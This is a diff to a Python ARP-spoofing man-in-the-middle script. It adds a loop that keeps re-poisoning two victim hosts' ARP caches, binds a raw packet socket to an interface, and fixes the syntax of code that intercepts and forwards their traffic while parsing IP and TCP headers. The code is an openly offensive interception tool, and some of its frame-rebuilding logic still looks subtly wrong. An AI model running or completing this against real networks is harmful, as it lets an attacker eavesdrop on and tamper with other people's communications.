@@ -1,3 +1,4 @@
+from time import sleep
 from threading import Thread
 from struct import *
 import subprocess
@@ -58,20 +59,25 @@ def mitm(host1, host2, mac1 = 0, mac2 = 0):
 	host1_mac = arp_reply(host1, host2, mac1)
 	host2_mac = arp_reply(host2, host1, mac2)
 	Thread(target=listen_to_incoming_packets, args=(host1, host2, host1_mac, host2_mac)).start()
+	while True:
+		host1_mac = arp_reply(host1, host2, mac1)
+		host2_mac = arp_reply(host2, host1, mac2)
+		sleep(200)
 	return [host1_mac, host2_mac]
 
 def listen_to_incoming_packets(Host_One_IP, Host_Two_IP, Host_One_MAC, Host_Two_MAC):
     s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
+    s.bind(('enp0s3', socket.SOCK_RAW))
 
     while True:
         packet = s.recvfrom(65565)
-		packet = packet[0]
-		ethernet_length = 14
-		eth_header = packet[:ethernet_length] #Ethernet header is 14 bytes
-		unpacked_eth = unpack('>6s6sH', eth_header)
-		#  unpacked_eth:
-		#-----------------
-		#  index:
+        packet = packet[0]
+        ethernet_length = 14
+        eth_header = packet[:ethernet_length] #Ethernet header is 14 bytes
+        unpacked_eth = unpack('>6s6sH', eth_header)
+	#  unpacked_eth:
+	#-----------------
+	#  index:
         #   0 -  Destination MAC Address (48 bits)
         #   1 - Source MAC Address (48 bits)
         #   2 - EtherType (16 bits)
@@ -96,22 +102,18 @@ def listen_to_incoming_packets(Host_One_IP, Host_Two_IP, Host_One_MAC, Host_Two_
         srcIP = socket.inet_ntoa(unpacked_iph[8])
         dstIP = socket.inet_ntoa(unpacked_iph[9])
 
-		#Forward packet to victim
-		new_dst_MAC = None
-		if dstIP == Host_One_IP:
-			new_dst_MAC = Host_One_MAC
-		else if dstIP == Host_Two_IP:
-			new_dst_MAC = Host_Two_MAC
+	#Forward packet to victim
+        new_dst_MAC = None
+        if dstIP == Host_One_IP:
+            new_dst_MAC = Host_One_MAC
+        elif dstIP == Host_Two_IP:
+            new_dst_MAC = Host_Two_MAC
 
-		if new_dst_MAC not None:
-			new_packet =
-			[
-				new_dst_MAC,
-				packet[7:]
-			]
-			s.send(b''.join(new_packet))
+        if new_dst_MAC != None:
+            new_packet =[new_dst_MAC,packet[6:]]
+            s.send(b''.join(new_packet))
 
-		ethAndIP_len = ethernet_length+ip_header_length
+        ethAndIP_len = ethernet_length+ip_header_length
         tcp_header = packet[ethAndIP_len:ethAndIP_len+20]
         unpacked_tcp = unpack('>HHLLBBHHH', tcp_header)
         #  unpacked_tcp:
